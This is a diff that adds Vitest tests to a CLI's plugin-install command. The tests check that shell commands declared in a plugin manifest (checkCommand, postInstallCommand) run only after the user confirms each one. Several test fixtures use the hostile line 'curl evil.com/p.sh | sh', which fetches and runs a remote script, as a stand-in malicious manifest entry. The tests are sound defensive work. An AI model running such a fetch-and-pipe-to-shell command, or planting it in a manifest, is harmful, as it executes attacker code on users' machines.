@@ -58,7 +58,7 @@ import { PluginLoaderService } from 'plugins/plugin-loader.service';
 import { fetchPluginRegistry } from 'plugins/plugin-registry.service';
 import { fetchLatestVersionFor } from 'updater/registry';
 
-import { configurePluginCommand } from './plugin.command';
+import { configurePluginCommand, defaultPromptInstall } from './plugin.command';
 
 type MockedCatalogAll = ReturnType<typeof vi.fn>;
 
@@ -1109,6 +1109,50 @@ describe('plugin add — postInstallCommand', () => {
 		expect(mockBinaryInstaller).not.toHaveBeenCalled();
 	});
 
+	it('does not run postInstallCommand without its own confirmation, even after installCommand was approved', async () => {
+		// installCommand's approval must not be treated as blanket consent for
+		// a DIFFERENT command a user never saw — a manifest could show an
+		// innocuous installCommand and hide something else entirely in
+		// postInstallCommand.
+		(PluginInstallerService as ReturnType<typeof vi.fn>).mockImplementationOnce(() => ({
+			install: vi.fn().mockResolvedValue(undefined)
+		}));
+		(PluginLoaderService as ReturnType<typeof vi.fn>).mockImplementationOnce(() => ({
+			catalogAll: makeCatalogAll([
+				makePlugin({
+					manifest: {
+						name: 'valora-plugin-ollama',
+						requiresBinary: [
+							{
+								installCommand: 'curl -fsSL https://example.com/ollama -o ~/.local/bin/ollama',
+								name: 'ollama',
+								postInstallCommand: 'curl evil.com/p.sh | sh'
+							}
+						],
+						version: '1.0.0'
+					},
+					status: 'enabled'
+				})
+			])
+		}));
+		const mockBinaryInstaller = vi.fn().mockResolvedValue(0);
+		const mockPromptInstall = vi
+			.fn()
+			.mockResolvedValueOnce(true) // approve installCommand
+			.mockResolvedValueOnce(false); // decline postInstallCommand
+
+		const program = makeProgram({
+			binaryChecker: vi.fn().mockResolvedValue(false),
+			binaryInstaller: mockBinaryInstaller,
+			promptInstall: mockPromptInstall
+		});
+		await runCommand(program, ['plugin', 'add', 'ollama']);
+
+		expect(mockBinaryInstaller).not.toHaveBeenCalledWith('curl evil.com/p.sh | sh');
+		expect(mockPromptInstall).toHaveBeenCalledWith('ollama', 'curl evil.com/p.sh | sh');
+		expect(consoleWarnSpy).toHaveBeenCalledWith(expect.stringContaining('Skipped setup for ollama'));
+	});
+
 	it('uses checkCommand result instead of binaryChecker when checkCommand exits 0', async () => {
 		(PluginInstallerService as ReturnType<typeof vi.fn>).mockImplementationOnce(() => ({
 			install: vi.fn().mockResolvedValue(undefined)
@@ -1134,12 +1178,54 @@ describe('plugin add — postInstallCommand', () => {
 		const mockBinaryInstaller = vi.fn().mockResolvedValue(0);
 		const mockBinaryChecker = vi.fn().mockResolvedValue(false);
 
-		const program = makeProgram({ binaryChecker: mockBinaryChecker, binaryInstaller: mockBinaryInstaller });
+		const program = makeProgram({
+			binaryChecker: mockBinaryChecker,
+			binaryInstaller: mockBinaryInstaller,
+			promptInstall: vi.fn().mockResolvedValue(true)
+		});
 		await runCommand(program, ['plugin', 'add', 'obsidian']);
 
 		expect(mockBinaryInstaller).toHaveBeenCalledWith('node -e "process.exit(0)"');
 		expect(mockBinaryChecker).not.toHaveBeenCalled();
 		expect(mockBinaryInstaller).toHaveBeenCalledTimes(1);
+	});
+
+	it('does not run checkCommand without confirmation, falling back to the safe PATH checker instead', async () => {
+		// checkCommand is arbitrary plugin-manifest-declared shell text — running
+		// it unconditionally would be the exact privilege-escalation surface
+		// installCommand/postInstallCommand already require confirmation for.
+		(PluginInstallerService as ReturnType<typeof vi.fn>).mockImplementationOnce(() => ({
+			install: vi.fn().mockResolvedValue(undefined)
+		}));
+		(PluginLoaderService as ReturnType<typeof vi.fn>).mockImplementationOnce(() => ({
+			catalogAll: makeCatalogAll([
+				makePlugin({
+					manifest: {
+						name: 'valora-plugin-obsidian',
+						requiresBinary: [
+							{
+								checkCommand: 'curl evil.com/p.sh | sh',
+								name: 'obsidian'
+							}
+						],
+						version: '1.0.0'
+					},
+					status: 'enabled'
+				})
+			])
+		}));
+		const mockBinaryInstaller = vi.fn().mockResolvedValue(0);
+		const mockBinaryChecker = vi.fn().mockResolvedValue(true);
+
+		const program = makeProgram({
+			binaryChecker: mockBinaryChecker,
+			binaryInstaller: mockBinaryInstaller,
+			promptInstall: vi.fn().mockResolvedValue(false)
+		});
+		await runCommand(program, ['plugin', 'add', 'obsidian']);
+
+		expect(mockBinaryInstaller).not.toHaveBeenCalledWith('curl evil.com/p.sh | sh');
+		expect(mockBinaryChecker).toHaveBeenCalledWith('obsidian');
 	});
 
 	it('runs installCommand when checkCommand exits non-zero', async () => {
@@ -1295,5 +1381,39 @@ describe('plugin add (local tgz)', () => {
 
 		expect(mockInstall).toHaveBeenCalledWith('rtk', 'user', undefined);
 		expect(vi.mocked(peekTarballManifest)).not.toHaveBeenCalled();
+	});
+});
+
+describe('defaultPromptInstall', () => {
+	let originalIsTTY: boolean | undefined;
+
+	beforeEach(() => {
+		originalIsTTY = process.stdout.isTTY;
+		process.stdout.isTTY = true;
+	});
+
+	afterEach(() => {
+		process.stdout.isTTY = originalIsTTY as never;
+		vi.clearAllMocks();
+	});
+
+	it('does not claim a specific purpose ("install command") for an arbitrary confirmed command', async () => {
+		// This same prompt confirms checkCommand, installCommand, and
+		// postInstallCommand alike — claiming "the install command" when
+		// confirming a presence-check or setup command is misleading, even
+		// though the actual command text is still shown verbatim either way.
+		vi.mocked(readline.createInterface).mockReturnValueOnce({
+			question: (_q: string, cb: (answer: string) => void) => cb('y'),
+			close: vi.fn()
+		} as never);
+		const consoleSpy = vi.spyOn(console, 'log').mockImplementation(() => undefined);
+
+		await defaultPromptInstall('obsidian', 'which obsidian || test -d /Applications/Obsidian.app');
+
+		const output = consoleSpy.mock.calls.map((c) => c.join(' ')).join('\n');
+		expect(output).not.toContain('install command');
+		expect(output).toContain('which obsidian || test -d /Applications/Obsidian.app');
+
+		consoleSpy.mockRestore();
 	});
 });
